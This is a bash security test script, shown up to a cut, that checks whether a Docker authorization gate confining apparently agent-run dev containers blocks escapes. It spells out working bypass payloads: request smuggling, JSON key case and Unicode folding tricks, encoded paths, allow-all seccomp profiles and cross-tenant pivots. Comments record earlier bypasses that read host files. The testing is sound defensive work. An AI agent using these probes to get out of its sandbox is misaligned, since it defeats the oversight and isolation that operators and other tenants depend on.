#!/usr/bin/env bash
# Run this INSIDE the dev container. It tries a series of escapes and a couple of
# legitimate operations, and reports whether the gate behaved.
pass=0; fail=0

expect_deny() {  # expect_deny "description" cmd...
  local desc="$1"; shift
  if "$@" >/dev/null 2>&1; then
    echo "  FAIL (allowed!): $desc"; fail=$((fail+1))
  else
    echo "  ok  (blocked):   $desc"; pass=$((pass+1))
  fi
}
expect_allow() {
  local desc="$1"; shift
  if "$@" >/dev/null 2>&1; then
    echo "  ok  (allowed):   $desc"; pass=$((pass+1))
  else
    echo "  FAIL (blocked!): $desc"; fail=$((fail+1))
  fi
}

echo "== should be BLOCKED =="
expect_deny "privileged container"      docker run --rm --privileged alpine true
expect_deny "bind-mount host root /"    docker run --rm -v /:/host alpine true
expect_deny "mount the docker socket"   docker run --rm -v /var/run/docker.sock:/s alpine true
expect_deny "--pid=host"                docker run --rm --pid=host alpine true
expect_deny "--cap-add SYS_ADMIN"       docker run --rm --cap-add SYS_ADMIN alpine true
expect_deny "seccomp=unconfined"        docker run --rm --security-opt seccomp=unconfined alpine true
# A CUSTOM allow-all seccomp profile disables seccomp without the word "unconfined"
# -- it was used (with a privileged exec, below) to gain CAP_SYS_ADMIN and escape.
# Only the default profile is allowed now; any custom profile must be BLOCKED.
allowall=$(mktemp); printf '{"defaultAction":"SCMP_ACT_ALLOW"}' > "$allowall"
expect_deny "custom allow-all seccomp profile" docker run --rm --security-opt "seccomp=$allowall" alpine true
expect_deny "custom apparmor profile"          docker run --rm --security-opt apparmor=my-profile alpine true
rm -f "$allowall"

# the gate (proxy) network -- discover it dynamically, then try joining by NAME and ID
gate_name=$(docker network ls --format '{{.Name}}' 2>/dev/null | grep -E '(^|[-_])gate$' | head -n1)
gate_id=$(docker network ls --format '{{.ID}} {{.Name}}' 2>/dev/null | grep -E '(^|[-_])gate$' | awk '{print $1}' | head -n1)
if [ -n "$gate_name" ]; then
  expect_deny "join gate by name ($gate_name)" docker run --rm --network "$gate_name" alpine true
  expect_deny "join gate by id ($gate_id)"     docker run --rm --network "$gate_id" alpine true
  # Post-create attach: create a plain (allowed) container, then try to wire it
  # onto the gate network after the fact -- must be blocked too, by name and id.
  tmp=$(docker create alpine true 2>/dev/null)
  if [ -n "$tmp" ]; then
    expect_deny "network-connect to gate by name" docker network connect "$gate_name" "$tmp"
    expect_deny "network-connect to gate by id"   docker network connect "$gate_id" "$tmp"
    docker rm -f "$tmp" >/dev/null 2>&1
  fi
else
  echo "  ??  could not find the gate network to test"
fi

proxy=$(docker ps --filter name=docker-endpoint-proxy -q 2>/dev/null | head -n1)
if [ -n "$proxy" ]; then
  expect_deny "exec into the proxy"     docker exec "$proxy" ls /
else
  echo "  ??  could not find the proxy container to test exec-escape"
fi

echo "== should be ALLOWED =="
expect_allow "plain unprivileged run"   docker run --rm alpine true
expect_allow "list containers"          docker ps

# Joining the dev network as a peer is how the browser image reaches servers in
# the dev container (the workflow runs `--network <project>_dev`); must be allowed.
# Discover OUR OWN dev network from what this container is attached to, NOT by grepping
# the global `docker network ls` -- the host can host many projects' `_dev` networks at
# once (per-devcontainer isolation), so "first `_dev` in the global list" can pick a
# FOREIGN project's network, turning this allow-case into the cont.20 cross-tenant pivot
# (which is now correctly DENIED) and spuriously FAILing. The cont.20 section below still
# uses the global list -- it deliberately wants a *different* project's `_dev`.
dev_name=$(docker inspect "$(hostname)" \
  --format '{{range $k,$v := .NetworkSettings.Networks}}{{$k}}{{"\n"}}{{end}}' 2>/dev/null \
  | grep -E '(^|[-_])dev$' | head -n1)
if [ -n "$dev_name" ]; then
  expect_allow "join the dev network as a peer ($dev_name)" docker run --rm --network "$dev_name" alpine true
else
  echo "  ??  could not find the dev network to test the peer-join"
fi

# Exec into a container WE created is the workflow's entire control layer, so it must
# both be authorized AND actually stream (the shim now passes the hijack upgrade
# through instead of forcing Connection: close, which used to 502). `true` exits fast.
own=$(docker run -d --network "$dev_name" alpine sleep 30 2>/dev/null)
if [ -n "$own" ]; then
  expect_allow "exec into our own container"        docker exec "$own" true
  # ...but a PRIVILEGED exec into our own (unprivileged) container would re-grant
  # CAP_SYS_ADMIN to the exec'd process, escalating past the create policy. The exec
  # body is now inspected, so this must be BLOCKED even though we own the target.
  expect_deny "privileged exec into our own container" docker exec --privileged "$own" true
  docker rm -f "$own" >/dev/null 2>&1
fi

# Attach is the same risk class as exec (reads, and can write, a container's I/O), so
# attaching to a container we DON'T own must be blocked -- otherwise the dev container
# could read/inject the I/O of unrelated host containers. `timeout` guards the hole
# case (a correct gate denies with 403 immediately; only a broken gate would stream).
if [ -n "$proxy" ]; then
  expect_deny "attach to a container we don't own" timeout 5 docker attach --no-stdin "$proxy"
fi

# NO host paths into siblings, period. There is no workspace allowlist anymore: a bind
# to the workspace itself is denied exactly like a bind to /etc, and every host-bind
# volume disguise is denied too. This removes the symlink / `..`-traversal / TOCTOU
# residual by construction -- with no bind source ever accepted, there is nothing for
# the daemon to resolve (or for an attacker to swap) at mount time.
# (The dev container's OWN `..:/workspace` mount is set host-side by compose and never
# traverses this gate, so editing code in the dev container is unaffected.)
echo "== no host mounts into siblings (all must be BLOCKED) =="
# WORKSPACE_HOST_PATH lives in .devcontainer/.env (written by initializeCommand); used
# here only to build realistic host paths for the bind/symlink cases.
envf="$(dirname "$0")/.devcontainer/.env"
[ -f "$envf" ] && . "$envf"
ws="${WORKSPACE_HOST_PATH:-/workspace}"
parent="$(dirname "$ws")"
expect_deny "bind /etc"                      docker run --rm -v /etc:/h alpine true
expect_deny "bind the workspace itself"      docker run --rm -v "$ws:/w" alpine true
expect_deny "bind <workspace>/.. (parent)"   docker run --rm -v "$ws/..:/h" alpine true
expect_deny "mount(type=bind) the workspace" docker run --rm --mount "type=bind,src=$ws,dst=/w" alpine true
# host-bind volumes (create / inline) -- a "named volume" that is really a host bind
expect_deny "volume create binding host root /" \
  docker volume create --driver local --opt type=none --opt o=bind --opt device=/ escvol
docker volume rm escvol >/dev/null 2>&1   # cleanup if an old shim let it through
expect_deny "inline host-bind volume (device=/)" \
  docker run --rm --mount 'type=volume,dst=/host,volume-driver=local,volume-opt=type=none,volume-opt=o=bind,volume-opt=device=/' alpine true
# a symlink in the writable workspace pointing OUT: previously the thorny residual,
# now moot -- the bind source is rejected before any symlink would be followed.
evil="/workspace/.escape_link_$$"; ln -sfn "$parent" "$evil"
expect_deny "bind an in-workspace symlink pointing OUT" \
  docker run --rm -v "$ws/$(basename "$evil"):/loot:ro" alpine true
rm -f "$evil"
vdev="/workspace/.vol_link_$$"; ln -sfn "$parent" "$vdev"
expect_deny "volume-create device = in-workspace symlink" \
  docker volume create --driver local --opt type=none --opt o=bind --opt device="$ws/$(basename "$vdev")" symlinkvol
docker volume rm symlinkvol >/dev/null 2>&1
rm -f "$vdev"

# Still allowed: a plain daemon-managed volume (no host `device`) touches no host path.
expect_allow "plain named volume mount" \
  docker run --rm --mount 'type=volume,src=plainvol,dst=/data' alpine true
docker volume rm plainvol >/dev/null 2>&1

# docker cp ownership: the /containers/{id}/archive endpoint (read = exfiltrate,
# write = inject) must be gated by ownership, exactly like exec/attach.
echo "== docker cp ownership =="
if [ -n "$proxy" ]; then
  expect_deny "docker cp OUT of a non-owned container"  docker cp "$proxy":/etc/hostname /tmp/cp_stolen
  expect_deny "docker cp INTO a non-owned container"    docker cp /etc/hostname "$proxy":/cp_inject
  rm -f /tmp/cp_stolen
fi
cpown=$(docker run -d --network "$dev_name" alpine sleep 30 2>/dev/null)
if [ -n "$cpown" ]; then
  expect_allow "docker cp INTO our own container"  docker cp /etc/hostname "$cpown":/tmp/ours
  expect_allow "docker cp OUT of our own container" docker cp "$cpown":/tmp/ours /tmp/cp_ours
  rm -f /tmp/cp_ours
  docker rm -f "$cpown" >/dev/null 2>&1
fi

# Request smuggling through the upgrade/relay path. The shim raw-relays GENUINE
# hijacks (exec start / attach / BuildKit session) so their streams survive. A
# fixed shim must NOT relay on a non-hijack path: a benign upgrade-flagged request
# (GET /_ping) followed by a PIPELINED second request used to reach tecnativa
# uninspected -- and tecnativa filters by endpoint, not body -- creating a
# privileged/host-bind container and bypassing the ENTIRE create policy. We send
# the exploit directly over DOCKER_HOST and assert nothing was created.
# NOTE: every raw-socket probe below sends `Connection: close`. The Go shim (unlike the
# old Python one, which forced close on every response) keeps connections alive, so a
# probe that does `while s.recv(): pass` would otherwise block for its full settimeout(4)
# waiting for a server close -- ~4s x 9 probes = ~36s of pure timeout. `Connection: close`
# makes the shim close after the (last) response so each probe returns instantly. This
# does NOT change any assertion (the verdict comes from the `docker inspect` afterward).
echo "== request smuggling through the upgrade/relay (must be BLOCKED) =="
smug_name="smuggle_escape_$$"
python3 - "$smug_name" <<'PY' 2>/dev/null || true
import socket, sys
name = sys.argv[1].encode()
body = b'{"Image":"alpine","Cmd":["true"],"HostConfig":{"Privileged":true,"Binds":["/:/host"]}}'
# req1 is an upgrade-flagged request on a NON-hijack path; req2 (a privileged,
# host-root-binding create) is pipelined in the same TCP segment.
req = (b"GET /_ping HTTP/1.1\r\nHost: d\r\nConnection: Upgrade\r\nUpgrade: tcp\r\n\r\n"
       b"POST /containers/create?name=" + name + b" HTTP/1.1\r\nHost: d\r\nConnection: close\r\n"
       b"Content-Type: application/json\r\nContent-Length: " + str(len(body)).encode()
       + b"\r\n\r\n" + body)
try:
    s = socket.socket(); s.settimeout(4); s.connect(("docker-authz", 2375))
    s.sendall(req)
    while s.recv(65536):
        pass
    s.close()
except Exception:
    pass
PY
if docker inspect "$smug_name" >/dev/null 2>&1; then
  echo "  FAIL (allowed!): pipelined create smuggled past the shim"; fail=$((fail+1))
  docker rm -f "$smug_name" >/dev/null 2>&1
else
  echo "  ok  (blocked):   pipelined create on a non-hijack upgrade path"; pass=$((pass+1))
fi

# cont.11: the cont.8 close-guard only covers NON-hijack paths. A HIJACK path
# (/session, attach, exec start) is forwarded VERBATIM with no `Connection: close`
# (it must be, or the 101 upgrade breaks). The bug: the shim used to set
# forward_body=body on hijack paths too, so a benign upgrade-flagged `POST /session`
# (which tecnativa rejects 400 but keeps keep-alive) with a PIPELINED create reached
# tecnativa as the next request -- a full create-policy bypass (confirmed reading a
# host file). The fix drops any pre-101 pipelined body on hijack paths.
smug2_name="smuggle_hijack_$$"
python3 - "$smug2_name" <<'PY' 2>/dev/null || true
import socket, sys
name = sys.argv[1].encode()
body = b'{"Image":"alpine","Cmd":["true"],"HostConfig":{"Privileged":true,"Binds":["/:/host"]}}'
# req1 is an upgrade-flagged request on a HIJACK path (/session); req2 (a privileged,
# host-root-binding create) is pipelined in the same TCP segment.
req = (b"POST /session HTTP/1.1\r\nHost: d\r\nConnection: Upgrade\r\nUpgrade: h2c\r\n\r\n"
       b"POST /containers/create?name=" + name + b" HTTP/1.1\r\nHost: d\r\nConnection: close\r\n"
       b"Content-Type: application/json\r\nContent-Length: " + str(len(body)).encode()
       + b"\r\n\r\n" + body)
try:
    s = socket.socket(); s.settimeout(4); s.connect(("docker-authz", 2375))
    s.sendall(req)
    while s.recv(65536):
        pass
    s.close()
except Exception:
    pass
PY
if docker inspect "$smug2_name" >/dev/null 2>&1; then
  echo "  FAIL (allowed!): pipelined create smuggled past a /session hijack"; fail=$((fail+1))
  docker rm -f "$smug2_name" >/dev/null 2>&1
else
  echo "  ok  (blocked):   pipelined create on a /session hijack upgrade path"; pass=$((pass+1))
fi

# JSON key case-confusion (cont. 14). The shim inspects the create body in Python
# (case-SENSITIVE dict lookups: `hc.get("Binds")`); the daemon parses it in Go, whose
# encoding/json matches struct fields CASE-INSENSITIVELY. A field the shim spells
# `Binds` sent as `binds`/`BINDS` is invisible to the policy yet honoured by the daemon
# -- a full create-policy bypass (confirmed reading a host file). The fixed shim folds
# every key to canonical form before the policy AND forwards only that canonical body.
# We fire each variant raw over DOCKER_HOST and assert no container was created.
echo "== JSON key case-confusion (re-cased fields must be BLOCKED) =="
case_try() {  # case_try "label" "json-body"
  local label="$1" cbody="$2" cname="casebypass_${1}_$$"
  python3 - "$cname" "$cbody" <<'PY' 2>/dev/null || true
import socket, sys
name, body = sys.argv[1].encode(), sys.argv[2].encode()
req = (b"POST /v1.45/containers/create?name=" + name + b" HTTP/1.1\r\nHost: d\r\nConnection: close\r\n"
       b"Content-Type: application/json\r\nContent-Length: " + str(len(body)).encode()
       + b"\r\n\r\n" + body)
try:
    # cont.20: the shim is off all networks; reach it over its unix socket, not tcp:2375.
    s = socket.socket(socket.AF_UNIX); s.settimeout(4); s.connect("/run/app/docker.sock")
    s.sendall(req)
    while s.recv(65536):
        pass
    s.close()
except Exception:
    pass
PY
  if docker inspect "$cname" >/dev/null 2>&1; then
    echo "  FAIL (allowed!): case-variant create '$label' bypassed the shim"; fail=$((fail+1))
    docker rm -f "$cname" >/dev/null 2>&1
  else
    echo "  ok  (blocked):   case-variant create '$label'"; pass=$((pass+1))
  fi
}
case_try "lower_binds"        '{"Image":"alpine","Cmd":["true"],"HostConfig":{"binds":["/:/host"]}}'
case_try "lower_hostconfig"   '{"Image":"alpine","Cmd":["true"],"hostconfig":{"Privileged":true,"Binds":["/:/host"]}}'
case_try "upper_BINDS"        '{"Image":"alpine","Cmd":["true"],"HostConfig":{"BINDS":["/:/host"]}}'
case_try "collision"          '{"Image":"alpine","Cmd":["true"],"HostConfig":{"Binds":["/a:/a"],"binds":["/:/host"]}}'
# cont. 15: Unicode case-fold differential. canon_keys folds with Python str.lower(),
# but the daemon matches struct fields with Go's bytes.EqualFold, which treats LONG-S
# 'ſ'(U+017F)=='s'. So `Bindſ` survives canon as `bindſ` (str.lower() leaves 'ſ'),
# misses hc.get("binds"), yet the daemon mounts it as HostConfig.Binds -- a confirmed
# host-file read. The fixed shim rejects ANY non-ASCII key on the create endpoint.
case_try "longs_binds"        '{"Image":"alpine","Cmd":["true"],"HostConfig":{"Bindſ":["/:/host"]}}'
# A genuinely lower-cased benign body (Go clients may send any case) must STILL work.
lcok="caselower_ok_$$"
python3 - "$lcok" <<'PY' 2>/dev/null || true
import socket, sys
name = sys.argv[1].encode()
body = b'{"image":"alpine","cmd":["true"],"hostconfig":{"networkmode":"bridge"}}'
req = (b"POST /v1.45/containers/create?name=" + name + b" HTTP/1.1\r\nHost: d\r\nConnection: close\r\n"
       b"Content-Type: application/json\r\nContent-Length: " + str(len(body)).encode()
       + b"\r\n\r\n" + body)
try:
    # cont.20: the shim is off all networks; reach it over its unix socket, not tcp:2375.
    s = socket.socket(socket.AF_UNIX); s.settimeout(4); s.connect("/run/app/docker.sock")
    s.sendall(req)
    while s.recv(65536):
        pass
    s.close()
except Exception:
    pass
PY
if docker inspect "$lcok" >/dev/null 2>&1; then
  echo "  ok  (allowed):   benign all-lower-case create still works"; pass=$((pass+1))
  docker rm -f "$lcok" >/dev/null 2>&1
else
  echo "  FAIL (blocked!): a benign lower-cased create was rejected"; fail=$((fail+1))
fi

# Path-encoding routing differential (cont. 16). The Python shim matched the create route
# with a regex on the RAW request path, but the daemon routes the URL-DECODED path. So
# `/containers/%63reate` (%63 = 'c') slipped past the regex -- the body was never inspected
# -- yet the daemon decoded it to `create` and honoured the (uninspected) host bind: a
# confirmed host-file read. The Go shim routes on net/http's decoded r.URL.Path, the same
# view the daemon routes on. We fire the exact escape raw over DOCKER_HOST and assert that
# no container was created.
echo "== path-encoding routing differential (cont.16, must be BLOCKED) =="
penc_name="pathenc_escape_$$"
python3 - "$penc_name" <<'PY' 2>/dev/null || true
import socket, sys
name = sys.argv[1].encode()
body = b'{"Image":"alpine","Cmd":["true"],"HostConfig":{"Binds":["/:/host"]}}'
# %63reate decodes to "create" at the daemon; the shim must decode-then-route too.
req = (b"POST /v1.45/containers/%63reate?name=" + name + b" HTTP/1.1\r\nHost: d\r\nConnection: close\r\n"
       b"Content-Type: application/json\r\nContent-Length: " + str(len(body)).encode()
       + b"\r\n\r\n" + body)
try:
    s = socket.socket(); s.settimeout(4); s.connect(("docker-authz", 2375))
    s.sendall(req)
    while s.recv(65536):
        pass
    s.close()
except Exception:
    pass
PY
if docker inspect "$penc_name" >/dev/null 2>&1; then
  echo "  FAIL (allowed!): %63reate path-encoding bypass created a container"; fail=$((fail+1))
  docker rm -f "$penc_name" >/dev/null 2>&1
else
  echo "  ok  (blocked):   %63reate path-encoding create bypass"; pass=$((pass+1))
fi

# Defense-in-depth create fields (cont. 19, assessment gaps 1 & 2). These don't grant a
# host escape on their own in this environment, but they hand a sibling MORE than the dev
# container has, violating the "same access, or less" invariant -- so they're denied.
echo "== defense-in-depth create fields (must be BLOCKED) =="
# cgroupns=host shares the host cgroup namespace (every other namespace mode is already
# gated; cgroup ns was the omission). `--cgroupns=private` (more isolated) stays allowed.
expect_deny  "--cgroupns=host"     docker run --rm --cgroupns=host    alpine true
expect_allow "--cgroupns=private"  docker run --rm --cgroupns=private alpine true
# MaskedPaths:[] unmasks /proc (kcore, sysrq-trigger -> a VM-wide DoS primitive). No CLI
# flag sets it, so fire it raw over DOCKER_HOST and assert no container is created.
mask_name="maskpath_escape_$$"
python3 - "$mask_name" <<'PY' 2>/dev/null || true
import socket, sys
name = sys.argv[1].encode()
body = b'{"Image":"alpine","Cmd":["true"],"HostConfig":{"MaskedPaths":[]}}'
req = (b"POST /v1.45/containers/create?name=" + name + b" HTTP/1.1\r\nHost: d\r\nConnection: close\r\n"
       b"Content-Type: application/json\r\nContent-Length: " + str(len(body)).encode()
       + b"\r\n\r\n" + body)
try:
    s = socket.socket(); s.settimeout(4); s.connect(("docker-authz", 2375))
    s.sendall(req)
    while s.recv(65536):
        pass
    s.close()
except Exception:
    pass
PY
if docker inspect "$mask_name" >/dev/null 2>&1; then
  echo "  FAIL (allowed!): MaskedPaths:[] override created a container"; fail=$((fail+1))
  docker rm -f "$mask_name" >/dev/null 2>&1
else
  echo "  ok  (blocked):   MaskedPaths:[] (/proc unmask) override"; pass=$((pass+1))
fi

# Globally-shared system volume (cont. 19, assessment finding F2). The VS Code Dev
# Containers extension mounts ONE global `vscode` server-cache volume into EVERY project's
# dev container; a root write there is a cross-project code-execution foothold. A sibling
# must not get a writable handle to it. Plain named volumes stay allowed (tested above).
echo "== shared system volume (must be BLOCKED) =="
expect_deny "mount the shared vscode volume" docker run --rm --mount "type=volume,source=vscode,dst=/sv" alpine true

# Non-canonical create path (cont. 19, assessment recommendation 1). A privileged create on
# a path that RESOLVES to /containers/create via `//`, `/./`, `/../` must be policed exactly
# like the canonical path -- not survive only because moby happens to 301 dirty paths.
echo "== non-canonical create path (must be BLOCKED) =="
clean_name="cleanpath_escape_$$"
python3 - "$clean_name" <<'PY' 2>/dev/null || true
import socket, sys
name = sys.argv[1].encode()
body = b'{"Image":"alpine","Cmd":["true"],"HostConfig":{"Privileged":true,"Binds":["/:/host"]}}'
# //containers/create cleans to /containers/create; the shim must route on the cleaned path.
req = (b"POST //v1.45/containers/create?name=" + name + b" HTTP/1.1\r\nHost: d\r\nConnection: close\r\n"
       b"Content-Type: application/json\r\nContent-Length: " + str(len(body)).encode()
       + b"\r\n\r\n" + body)
try:
    s = socket.socket(); s.settimeout(4); s.connect(("docker-authz", 2375))
    s.sendall(req)
    while s.recv(65536):
        pass
    s.close()
except Exception:
    pass
PY
if docker inspect "$clean_name" >/dev/null 2>&1; then
  echo "  FAIL (allowed!): non-canonical create path bypassed the policy"; fail=$((fail+1))
  docker rm -f "$clean_name" >/dev/null 2>&1
else
  echo "  ok  (blocked):   non-canonical (//) create path is policed"; pass=$((pass+1))
fi

# Cross-tenant read endpoints (cont. 19, assessment finding F1). export/logs/top/changes/
# inspect of a container in ANOTHER Compose project must be denied (they leaked a sibling
# project's container-layer fs -- incl. another agent's transcript -- and runtime data). We
# look for a container whose com.docker.compose.project differs from ours; skip if none.
echo "== cross-tenant read endpoints (foreign-project reads must be BLOCKED) =="
ourproj=$(docker inspect "$(hostname)" --format '{{index .Config.Labels "com.docker.compose.project"}}' 2>/dev/null)
# Identify a FOREIGN container by NAME, not by inspecting it: cross-tenant inspect is now
# denied (that is the control under test), so the old "inspect each container's project label"
# discovery can no longer see foreign containers at all. `docker ps` (the list endpoint) is
# ungated and still reveals names; ours are prefixed with our compose project, foreign ones
# are not. (Likewise below we find a foreign network by NAME, not by inspecting it.)
foreign=""
if [ -n "$ourproj" ]; then
  for cname in $(docker ps --format '{{.Names}}' 2>/dev/null); do
    case "$cname" in
      "$ourproj"*) : ;;                  # one of ours
      *) foreign="$cname"; break ;;      # a different project's container
    esac
  done
fi
if [ -n "$foreign" ]; then
  expect_deny "docker export a foreign-project container" docker export "$foreign" -o /dev/null
  expect_deny "docker logs a foreign-project container"   docker logs "$foreign"
  expect_deny "docker inspect a foreign-project container" docker inspect --type container "$foreign"
else
  echo "  ??  no foreign-project container present to test cross-tenant reads"
fi

# Cross-tenant network pivot (cont.20) -- the vulnerability four pen-test agents independently
# found. The shim now listens on a UNIX SOCKET (no IP on the `_dev` bridge), AND refuses to
# place a sibling on, connect onto, or inspect a FOREIGN project's network -- the route used to
# reach a victim's shim and drive it into reading its own (same-project) containers. All BLOCKED.
echo "== cross-tenant network pivot (must be BLOCKED) =="
foreign_net=""
for n in $(docker network ls --format '{{.Name}}' 2>/dev/null | grep -E '(^|[-_])dev$'); do
  if [ -n "$dev_name" ] && [ "$n" != "$dev_name" ]; then foreign_net="$n"; break; fi
done
if [ -n "$foreign_net" ]; then
  expect_deny "run a sibling on a foreign _dev network ($foreign_net)" docker run --rm --network "$foreign_net" alpine true
  expect_deny "inspect a foreign _dev network (IP recon for the pivot)" docker network inspect "$foreign_net"
  ptmp=$(docker create alpine true 2>/dev/null)
  if [ -n "$ptmp" ]; then
    expect_deny "network-connect a sibling onto a foreign _dev network" docker network connect "$foreign_net" "$ptmp"
    # assessment finding F4: disconnect was ungated (a sibling could sever ANY container from
    # ANY network -- a cross-tenant DoS). The shim denies on the network being foreign BEFORE
    # the daemon checks membership, so this is a clean deny regardless of $ptmp's membership.
    expect_deny "network-disconnect from a foreign _dev network" docker network disconnect "$foreign_net" "$ptmp"
    docker rm -f "$ptmp" >/dev/null 2>&1
  fi
else
  echo "  ??  no foreign _dev network present to test the pivot"
fi
# Cross-tenant LIFECYCLE control (cont.20): rename/stop/kill/rm of a foreign container is now
# owned-only. We rename to a DISTINCT name so a hole would actually SUCCEED (exit 0 -> FAIL);
# the same-name rename in earlier rounds would have falsely "passed" on the daemon's own error.
if [ -n "$foreign" ]; then
  expect_deny "rename a foreign-project container" docker rename "$foreign" "${foreign}_pivot_probe"
  expect_deny "stop a foreign-project container"   docker stop -t 0 "$foreign"
  # assessment finding F6: `start` was missing from the owned-only lifecycle set. The shim
  # denies on ownership before the daemon acts, so this is clean whether or not it's running.
  expect_deny "start a foreign-project container"  docker start "$foreign"
fi
# Reading our OWN project / created containers must still work (the workflow inspects the
# dev container itself and `docker logs`/`inspect`s containers it created).
ownr=$(docker run -d --network "${dev_name:-bridge}" alpine sleep 30 2>/dev/null)
if [ -n "$ownr" ]; then
  expect_allow "docker logs our own container"     docker logs "$ownr"
  expect_allow "docker inspect our own container"  docker inspect --type container "$ownr"
  docker rm -f "$ownr" >/dev/null 2>&1
fi
expect_allow "inspect the dev container itself (same project)" docker inspect --type container "$(hostname)"

# Build network-mode gate (cont. 9). `POST /build` is not body-inspected, but a
# `--network=host` build runs each RUN step in the VM host netns, which routes to the
# gate bridge -- a RUN can curl tecnativa directly and create a host-binding container,
# bypassing the ENTIRE create policy. `--network container:<id>` and `--network <gate>`
# are the same class. Default/bridge/none builds stay on an isolated build bridge and
# must keep working (the real workflow sets no build network).
echo "== build network-mode gate (host/container/gate must be BLOCKED) =="
bctx=$(mktemp -d)
printf 'FROM alpine:latest\nRUN true\n' > "$bctx/Dockerfile"
# Force the DAEMON's embedded builder (`DOCKER_BUILDKIT=0`), which is the builder the
# real workflow uses (dockerode `image.build` -> `POST /build` -> daemon, "Step x/y").
# The CLI's *default* buildx "docker-container" driver instead boots a PRIVILEGED
# `moby/buildkit` helper container first -- which the gate (correctly) denies, so every
# build below would fail at "privileged" before its network mode is ever evaluated.
# The embedded builder sends `?networkmode=...` in the query, which is exactly what
# `build_net_static_deny` / the gate-net check in the shim inspect.
expect_deny "build --network=host"          env DOCKER_BUILDKIT=0 docker build --network=host          --no-cache -t escape_build_host "$bctx"
expect_deny "build --network=container:foo" env DOCKER_BUILDKIT=0 docker build --network=container:foo  --no-cache -t escape_build_ctr  "$bctx"
if [ -n "$gate_name" ]; then
  expect_deny "build --network=$gate_name (gate)" env DOCKER_BUILDKIT=0 docker build --network="$gate_name" --no-cache -t escape_build_gate "$bctx"
fi
expect_allow "plain build (default network)"     env DOCKER_BUILDKIT=0 docker build --no-cache -t escape_build_ok "$bctx"
docker rmi -f escape_build_ok >/dev/null 2>&1
rm -rf "$bctx"

# cont.10: tecnativa is reached over a unix socket and runs `network_mode: none`, so
# it has NO IP on any bridge -- there is nothing for a build/sibling netns (even a
# host-netns build) to route to. This closes the un-inspected-build escape (cont.9)
# by construction, for the legacy AND BuildKit builders. We assert the proxy has no
# address and that no gate network exists at all (reads pass through the shim ungated).
echo "== cont.10: tecnativa off all networks (no IP path to the socket) =="
prox=$(docker ps --filter ancestor=tecnativa/docker-socket-proxy:latest --format '{{.ID}}' 2>/dev/null | head -n1)
if [ -n "$prox" ]; then
  # Keep only real dotted-quad IPv4s: tecnativa is on the `none` pseudo-network, whose
  # IPAddress renders as the literal "invalid IP" on Docker 29.x (not an empty string),
  # which would otherwise look like a non-empty address and false-FAIL this check.
  ips=$(docker inspect "$prox" --format '{{range .NetworkSettings.Networks}}{{.IPAddress}} {{end}}' 2>/dev/null | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' | tr -d '[:space:]')
  nm=$(docker inspect "$prox" --format '{{.HostConfig.NetworkMode}}' 2>/dev/null)
  if [ -z "$ips" ] && [ "$nm" = "none" ]; then
    echo "  ok  (no IP):     tecnativa NetworkMode=none, no addresses"; pass=$((pass+1))
  else
    echo "  FAIL (reachable!): tecnativa has an IP (mode=$nm ips=$ips)"; fail=$((fail+1))
  fi
else
  echo "  note: endpoint-proxy container not found by image filter (skipped)"
fi
if docker network ls --format '{{.Name}}' 2>/dev/null | grep -qE '(^|[-_])gate$'; then
  echo "  FAIL (exists!):  a *_gate network is still present"; fail=$((fail+1))
else
  echo "  ok  (gone):      no gate network exists anymore"; pass=$((pass+1))
fi

# cont.20: the authz shim itself is now OFF all networks (it listens on a unix socket on the
# app-sock volume), so there is no shim IP for a cross-tenant pivot to reach. Assert the dev
# container's DOCKER_HOST is a unix socket and the shim container carries no address.
echo "== cont.20: authz shim off all networks (no IP path to the control plane) =="
case "${DOCKER_HOST:-}" in
  unix://*) echo "  ok  (unix):     DOCKER_HOST is a unix socket ($DOCKER_HOST)"; pass=$((pass+1));;
  *)        echo "  FAIL (tcp!):    DOCKER_HOST is not a unix socket ($DOCKER_HOST)"; fail=$((fail+1));;
esac
authz=$(docker ps --filter name=docker-authz --format '{{.ID}}' 2>/dev/null | head -n1)
if [ -n "$authz" ]; then
  aips=$(docker inspect "$authz" --format '{{range .NetworkSettings.Networks}}{{.IPAddress}} {{end}}' 2>/dev/null | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' | tr -d '[:space:]')
  anm=$(docker inspect "$authz" --format '{{.HostConfig.NetworkMode}}' 2>/dev/null)
  if [ -z "$aips" ] && [ "$anm" = "none" ]; then
    echo "  ok  (no IP):     authz shim NetworkMode=none, no addresses"; pass=$((pass+1))
  else
    echo "  FAIL (reachable!): authz shim has an IP (mode=$anm ips=$aips)"; fail=$((fail+1))
  fi
else
  echo "  ??  could not find the docker-authz container to verify it is off-network"
fi
# The socket now lives on a named volume; a sibling must not be able to mount it and
# talk to tecnativa directly (the network bypass reborn as a volume bypass).
gsock=$(docker volume ls --format '{{.Name}}' 2>/dev/null | grep -E '(^|[-_])gate-sock$' | head -n1)
gsock=${gsock:-proj_gate-sock}   # fall back to a plausible name so the deny still fires
expect_deny "mount the gate socket volume" docker run --rm --mount "type=volume,source=$gsock,dst=/g" alpine true
# cont.20: the shim's DOWNSTREAM authz socket lives on the app-sock volume. A sibling that
# mounted it would get a direct, caller-unchecked handle to the control plane (the gate-sock
# bypass reborn). Must be BLOCKED exactly like gate-sock.
asock=$(docker volume ls --format '{{.Name}}' 2>/dev/null | grep -E '(^|[-_])app-sock$' | head -n1)
asock=${asock:-proj_app-sock}    # fall back to a plausible name so the deny still fires
expect_deny "mount the app-sock (authz) volume" docker run --rm --mount "type=volume,source=$asock,dst=/a" alpine true

# --- assessment control-plane fixes (F3/F7/F8/F10) -------------------------------------
echo "== deny-by-default control-plane gaps (assessment F3/F7/F8/F10, must be BLOCKED) =="

# F3: the daemon also honours the DEPRECATED `:`-separator security-opt form, so a colon-
# separated CUSTOM (allow-all) seccomp profile -- no "unconfined" substring -- slipped past
# the `=`-only parse and re-opened the cont.12 confinement bypass. The docker CLI emits the
# `=` form, so fire the colon form raw over DOCKER_HOST and assert no container is created.
colon_name="colon_seccomp_$$"
python3 - "$colon_name" <<'PY' 2>/dev/null || true
import socket, sys
name = sys.argv[1].encode()
body = b'{"Image":"alpine","Cmd":["true"],"HostConfig":{"SecurityOpt":["seccomp:{\\"defaultAction\\":\\"SCMP_ACT_ALLOW\\"}"]}}'
req = (b"POST /v1.45/containers/create?name=" + name + b" HTTP/1.1\r\nHost: d\r\nConnection: close\r\n"
       b"Content-Type: application/json\r\nContent-Length: " + str(len(body)).encode()
       + b"\r\n\r\n" + body)
try:
    s = socket.socket(socket.AF_UNIX); s.settimeout(4); s.connect("/run/app/docker.sock")
    s.sendall(req)
    while s.recv(65536):
        pass
    s.close()
except Exception:
    pass
PY
